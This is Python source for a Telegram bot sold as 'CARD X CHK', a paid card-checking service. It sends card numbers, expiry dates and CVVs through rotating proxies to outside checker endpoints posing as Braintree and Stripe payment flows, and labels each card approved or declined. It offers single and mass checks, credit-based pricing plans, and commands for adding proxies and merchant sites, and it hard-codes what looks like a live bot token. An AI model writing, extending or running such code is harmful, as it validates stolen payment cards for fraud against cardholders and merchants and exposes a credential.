from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
import aiohttp
import random
import os
import json
import asyncio
import urllib.parse

BOT_TOKEN = "8552044154:AAH7SEWj3gWi6ZMZkd6tNv7ISwxNbChQBhc"
LOGO_URL = "https://ibb.co/s9wsTW7j"
DEV_INFO = "@vasfx"
user_db = {}

def get_user_data(user):
    uid = user.id
    if uid not in user_db:
        user_db[uid] = {
            "id": uid,
            "username": f"@{user.username}" if user.username else user.first_name,
            "mane": f"{user.first_name} [Trial]",
            "credits": 248,
            "joined": "14/01/26 16:01:15",
        }
    return user_db[uid]

def load_proxies():
    if not os.path.exists("proxy.txt"):
        return []
    with open("proxy.txt", "r") as f:
        return [line.strip() for line in f if line.strip()]

def save_proxy(proxy):
    with open("proxy.txt", "a") as f:
        f.write(proxy + "\n")

def parse_proxy(proxy_str):
    parts = proxy_str.split(":")
    if len(parts) == 4 and '@' not in proxy_str:
        ip, port, user, passwd = parts
        return f"{user}:{passwd}@{ip}:{port}"
    elif '@' in proxy_str:
        return proxy_str
    else:
        raise ValueError("Invalid proxy format. Use ip:port:user:pass or user:pass@ip:port")

def load_sites():
    if not os.path.exists("sites.txt"):
        return []
    with open("sites.txt", "r") as f:
        return [line.strip() for line in f if line.strip()]

def save_site(site):
    with open("sites.txt", "a") as f:
        f.write(site + "\n")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    data = get_user_data(user)
    
    # EXACTLY LIKE YOUR SCREENSHOT
    user_info = (
        "CARD X CHK\n"
        "944 monthly users\n\n"
        "Status: Active ✅\n\n"
        f"ID → 8332893479\n"
        f"User → {data['username']}\n"
        f"Mane → {data['mane']}\n"
        f"Credits → {data['credits']}\n"
        f"Joned → {data['joined']}\n"
        f"Dev → kali linuxx"
    )
    
    # EXACTLY LIKE YOUR SCREENSHOT
    keyboard = [
        [InlineKeyboardButton("Gates", callback_data="menu_gates"),
         InlineKeyboardButton("Pricing", callback_data="menu_pricing")],
        [InlineKeyboardButton("Group ↗", url="https://t.me/YourGroupLink"),
         InlineKeyboardButton("Updates ↗", url="https://t.me/YourUpdatesLink")],
        [InlineKeyboardButton("Dev ↗", url="https://t.me/YourDevLink"),
         InlineKeyboardButton("Support ↗", url="https://t.me/YourSupportLink")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_photo(
        update.effective_chat.id, 
        LOGO_URL,
        caption=user_info, 
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "menu_gates":
        keyboard = [
            [InlineKeyboardButton("Auth", callback_data="gates_auth"),
             InlineKeyboardButton("Charge", callback_data="gates_charge")],
            [InlineKeyboardButton("Mass Gates", callback_data="gates_mass")],
            [InlineKeyboardButton("Back", callback_data="menu_back")]
        ]
        text = "CARD X CHK\n\nChoose your gateway mode:"
        await query.edit_message_caption(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "gates_auth":
        text = (
            "CARD X CHK\n\n"
            "Gate → Braintree Auth\n"
            "Command → /b3\n"
            "Status → Online ✅\n\n"
            "Gate → Stripe Auth\n"
            "Command → /st\n"
            "Status → Online ✅"
        )
        keyboard = [[InlineKeyboardButton("Back", callback_data="menu_gates")]]
        await query.edit_message_caption(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "gates_charge":
        text = (
            "CARD X CHK\n\n"
            "Gate → Shopify Charge\n"
            "Command → /sh\n"
            "Status → Online ✅"
        )
        keyboard = [[InlineKeyboardButton("Back", callback_data="menu_gates")]]
        await query.edit_message_caption(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "gates_mass":
        text = (
            "CARDXCHK\n\n"
            "MASS GATES STATUS\n\n"
            "Gate → Mass Braintree\n"
            "Command → /mb3\n"
            "Status → Online ✅\n\n"
            "Gate → Mass Stripe\n"
            "Command → /mst\n"
            "Status → Online ✅"
        )
        keyboard = [[InlineKeyboardButton("Back", callback_data="menu_gates")]]
        await query.edit_message_caption(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "menu_pricing":
        text = (
            "CARD X CHK\n\n"
            "Available Access Plans\n\n"
            "Core Acces 🎁\n"
            "Duration → 7 days\n"
            "Price → ₦8$\n"
            "Credits → Unlimited until plan ends\n\n"
            "Elite Acces 🎁\n"
            "Duration → 15 days\n"
            "Price → ₦14$\n"
            "Credits → Unlimited until plan ends\n\n"
            "Root Acces 🏆\n"
            "Duration → 30 days\n"
            "Price → ₦25$\n"
            "Credits → Unlimited until plan ends\n\n"
            "X-Acces 🎁\n"
            "Duration → 90 days\n"
            "Price → ₦60$\n"
            "Credits → Unlimited until plan ends"
        )
        keyboard = [
            [InlineKeyboardButton("Buy Now", url="https://t.me/YourBuyLink")],
            [InlineKeyboardButton("Back", callback_data="menu_back")]
        ]
        await query.edit_message_caption(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "menu_back":
        await start(update, context)

# ==================== /b3 COMMAND (Braintree Auth) ====================
async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    data = get_user_data(user)

    if data['credits'] <= 0:
        await update.message.reply_text("❌ Insufficient credits.")
        return

    args = context.args
    if not args:
        await update.message.reply_text("Usage: /b3 <card> [proxy]\nExample: /b3 5555530005953346|05|2026|836")
        return

    card = args[0]
    proxy = args[1] if len(args) > 1 else None

    proxies = load_proxies()
    if not proxy:
        if not proxies:
            await update.message.reply_text("❌ No proxy available.")
            return
        proxy = random.choice(proxies)

    processing_msg = await update.message.reply_text(
        f"Processing ...\n{card}\nGateway → Braintree Auth"
    )

    encoded_proxy = urllib.parse.quote(proxy, safe='')
    url = f"https://chk.vkrm.site/?card={card}&proxy={encoded_proxy}"
    headers = {"User-Agent": "Mozilla/5.0"}
    timeout = aiohttp.ClientTimeout(total=15)

    try:
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    await processing_msg.edit_text(f"❌ Error: API returned status code {resp.status}")
                    return
                
                result_text = await resp.text()
                data["credits"] -= 1

                try:
                    res_json = json.loads(result_text)
                    msg_lower = res_json.get("message", "").lower()
                    
                    approved_keywords = ["fully confirmed success", "approved", "nice! new payment method added", "success"]
                    declined_keywords = ["declined", "card issuer declined", "cvv", "fail"]
                    
                    approved = any(k in msg_lower for k in approved_keywords)
                    declined = any(k in msg_lower for k in declined_keywords)
                    
                    status_text = "APPROVED ✅" if approved else ("DECLINED ❌" if declined else "UNKNOWN ❓")
                    response_msg = res_json.get("message", "No response")
                    
                    text = (
                        f"Status → {status_text}\n\n"
                        f"Card\n{card}\n\n"
                        f"Gateway → Braintree Auth\n"
                        f"Response → {response_msg}\n\n"
                        f"User → {data['mane']}\n"
                        f"Dev → kali linuxx\n\n"
                        f"Credits remaining: {data['credits']}"
                    )
                    await processing_msg.edit_text(text)
                except:
                    await processing_msg.edit_text(f"Result:\n{result_text}")
    except Exception as e:
        await processing_msg.edit_text(f"❌ Error: {e}")

# ==================== /mb3 COMMAND (Mass Braintree) ====================
async def mb3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    data = get_user_data(user)
    input_text = update.message.text.partition(' ')[2].strip()

    if not input_text:
        await update.message.reply_text("Usage: /mb3 <card1>\n<card2>\n<card3>")
        return

    cards = [line.strip() for line in input_text.split('\n') if line.strip()]
    num_cards = len(cards)

    if data['credits'] < num_cards:
        await update.message.reply_text(f"❌ Insufficient credits. You have {data['credits']} but sent {num_cards} cards.")
        return

    proxies = load_proxies()
    if not proxies:
        await update.message.reply_text("❌ No proxy available.")
        return

    processing_msg = await update.message.reply_text(f"Processing {num_cards} cards in mass check ...\nGateway → Braintree Auth")
    
    timeout = aiohttp.ClientTimeout(total=15)
    headers = {"User-Agent": "Mozilla/5.0"}

    async def check_single_card(card, proxy):
        encoded_proxy = urllib.parse.quote(proxy, safe='')
        url = f"https://chk.vkrm.site/?card={card}&proxy={encoded_proxy}"
        try:
            async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        return f"❌ Error for {card}"
                    
                    result_text = await resp.text()
                    try:
                        res_json = json.loads(result_text)
                        msg_lower = res_json.get("message", "").lower()
                        
                        approved_keywords = ["fully confirmed success", "approved", "nice! new payment method added", "success"]
                        declined_keywords = ["declined", "card issuer declined", "cvv", "fail"]
                        
                        approved = any(k in msg_lower for k in approved_keywords)
                        declined = any(k in msg_lower for k in declined_keywords)
                        
                        status_text = "APPROVED ✅" if approved else ("DECLINED ❌" if declined else "UNKNOWN ❓")
                        response_msg = res_json.get("message", "No response")[:50]
                        
                        return f"Card: {card}\nStatus: {status_text}\nResponse: {response_msg}\n────────────\n"
                    except:
                        return f"Card: {card}\nResponse: {result_text[:100]}\n────────────\n"
        except:
            return f"Card: {card}\nError: Connection failed\n────────────\n"

    tasks = [check_single_card(card, random.choice(proxies)) for card in cards]
    results = await asyncio.gather(*tasks)
    data['credits'] -= num_cards

    full_message = f"Braintree Auth Results ({num_cards} cards):\n\n" + "\n".join(results)
    full_message += f"\nUser → {data['mane']}\nDev → kali linuxx\n\nCredits remaining: {data['credits']}"

    await processing_msg.edit_text(full_message)

# ==================== /st COMMAND (Stripe Auth - REPLACING /sh) ====================
async def st(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    data = get_user_data(user)

    if data['credits'] <= 0:
        await update.message.reply_text("❌ Insufficient credits.")
        return

    args = context.args
    if not args:
        await update.message.reply_text("Usage: /st <card>\nExample: /st 5555530005953346|05|2026|836")
        return

    card = args[0]

    sites = load_sites()
    if not sites:
        await update.message.reply_text("❌ No sites available.")
        return

    site = random.choice(sites)

    processing_msg = await update.message.reply_text(
        f"Processing ...\n{card}\nGateway → Stripe Auth\nSite → {site}"
    )

    # USING THE SAME API AS YOUR ORIGINAL /sh COMMAND
    url = f"https://autostripe-1e7s.onrender.com/try?key=ryu&site={site}&cc={card}"
    headers = {"User-Agent": "Mozilla/5.0"}
    timeout = aiohttp.ClientTimeout(total=15)

    try:
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    await processing_msg.edit_text(f"❌ Error: API returned status code {resp.status}")
                    return
                
                result_text = await resp.text()
                data["credits"] -= 1

                try:
                    res_json = json.loads(result_text)
                    status_api = res_json.get("Status", "").lower()
                    response_msg = res_json.get("Response", "")

                    if "approved" in status_api or "success" in status_api:
                        status_text = "APPROVED ✅"
                    elif "declined" in status_api:
                        status_text = "DECLINED ❌"
                    else:
                        status_text = "UNKNOWN ❓"

                    text = (
                        f"Status → {status_text}\n\n"
                        f"Card\n{card}\n\n"
                        f"Gateway → Stripe Auth\n"
                        f"Site → {site}\n"
                        f"Response → {response_msg}\n\n"
                        f"User → {data['mane']}\n"
                        f"Dev → kali linuxx\n\n"
                        f"Credits remaining: {data['credits']}"
                    )
                    await processing_msg.edit_text(text)
                except:
                    await processing_msg.edit_text(f"Result:\n{result_text}")
    except Exception as e:
        await processing_msg.edit_text(f"❌ Error: {e}")

# ==================== /mst COMMAND (Mass Stripe) ====================
async def mst(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    data = get_user_data(user)
    input_text = update.message.text.partition(' ')[2].strip()

    if not input_text:
        await update.message.reply_text("Usage: /mst <card1>\n<card2>\n<card3>")
        return

    cards = [line.strip() for line in input_text.split('\n') if line.strip()]
    num_cards = len(cards)

    if data['credits'] < num_cards:
        await update.message.reply_text(f"❌ Insufficient credits. You have {data['credits']} but sent {num_cards} cards.")
        return

    sites = load_sites()
    if not sites:
        await update.message.reply_text("❌ No sites available.")
        return

    processing_msg = await update.message.reply_text(f"Processing {num_cards} cards in mass check ...\nGateway → Stripe Auth")
    
    timeout = aiohttp.ClientTimeout(total=15)
    headers = {"User-Agent": "Mozilla/5.0"}

    async def check_single_stripe(card):
        site = random.choice(sites)
        url = f"https://autostripe-1e7s.onrender.com/try?key=ryu&site={site}&cc={card}"
        
        try:
            async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        return f"❌ Error for {card}"
                    
                    result_text = await resp.text()
                    try:
                        res_json = json.loads(result_text)
                        status_api = res_json.get("Status", "").lower()
                        response_msg = res_json.get("Response", "")
                        
                        if "approved" in status_api or "success" in status_api:
                            status_text = "APPROVED ✅"
                        elif "declined" in status_api:
                            status_text = "DECLINED ❌"
                        else:
                            status_text = "UNKNOWN ❓"
                        
                        return f"Card: {card}\nSite: {site}\nStatus: {status_text}\nResponse: {response_msg[:50]}\n────────────\n"
                    except:
                        return f"Card: {card}\nResponse: {result_text[:100]}\n────────────\n"
        except:
            return f"Card: {card}\nError: Connection failed\n────────────\n"

    tasks = [check_single_stripe(card) for card in cards]
    results = await asyncio.gather(*tasks)
    data['credits'] -= num_cards

    full_message = f"Stripe Auth Results ({num_cards} cards):\n\n" + "\n".join(results)
    full_message += f"\nUser → {data['mane']}\nDev → kali linuxx\n\nCredits remaining: {data['credits']}"

    await processing_msg.edit_text(full_message)

# ==================== UTILITY COMMANDS (Keep only what's needed) ====================
async def addsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_text = update.message.text
    site_input = message_text.replace('/addsite', '').strip()
    
    if not site_input:
        await update.message.reply_text("Usage: /addsite <site1>\n<site2>\nExample: /addsite example.com")
        return

    sites = site_input.split('\n')
    added = 0
    
    for s in sites:
        s = s.strip()
        if s:
            save_site(s)
            added += 1

    await update.message.reply_text(f"✅ Added {added} sites.")

async def addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_text = update.message.text
    proxy_input = message_text.replace('/addproxy', '').strip()
    
    if not proxy_input:
        await update.message.reply_text("Usage: /addproxy <proxy>\nFormat: ip:port:user:pass or user:pass@ip:port")
        return

    proxies = proxy_input.split('\n')
    added = 0
    
    for p in proxies:
        p = p.strip()
        if p:
            try:
                formatted_proxy = parse_proxy(p)
                save_proxy(formatted_proxy)
                added += 1
            except:
                pass

    await update.message.reply_text(f"✅ Added {added} proxies.")

# ==================== MAIN FUNCTION ====================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # ONLY THE COMMANDS YOU WANTED
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("b3", b3))       # Braintree Auth
    app.add_handler(CommandHandler("mb3", mb3))     # Mass Braintree
    app.add_handler(CommandHandler("st", st))       # Stripe Auth
    app.add_handler(CommandHandler("mst", mst))     # Mass Stripe
    
    # Only essential utilities
    app.add_handler(CommandHandler("addsite", addsite))
    app.add_handler(CommandHandler("addproxy", addproxy))
    
    # Menu handler
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    print("Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()